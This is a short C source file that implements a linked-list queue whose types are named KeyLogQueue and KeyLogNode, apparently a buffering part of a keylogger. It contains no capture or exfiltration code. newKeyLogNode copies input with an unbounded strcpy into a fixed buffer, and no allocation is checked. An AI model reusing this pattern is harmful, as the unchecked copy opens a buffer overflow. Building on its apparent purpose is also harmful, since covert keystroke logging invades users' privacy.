#include "settings.h"

struct KeyLogQueue* createKeyLogQueue() {
    struct KeyLogQueue* q = (struct KeyLogQueue*)malloc(sizeof(struct KeyLogQueue));
    q->first = q->last = NULL;
    return q;
}

struct KeyLogNode* newKeyLogNode(char* data) {
    struct KeyLogNode* tmp = (struct KeyLogNode*)malloc(sizeof(struct KeyLogNode));
    strcpy(tmp->data, data);
    tmp->next = NULL;
    return tmp;
}

void insertKeyLogNode (struct KeyLogQueue* q, char* data) {
    struct KeyLogNode* node = newKeyLogNode(data);

    // empty queue
    if (q->last == NULL) {
        q->first = q->last = node;
        return;
    }
    // non-empty queue

    q->last->next = node;
    q->last = node;
    return;
}

struct KeyLogNode* DequeueKeyLogNode (struct KeyLogQueue* q) {
    if (q->last == NULL) {
        return NULL;
    }

    struct KeyLogNode* tmp = q->first;

    //pop 
    q->first = q->first->next;

    if (q->first == NULL) {
        q->last = NULL;
    }
    return tmp;
} 

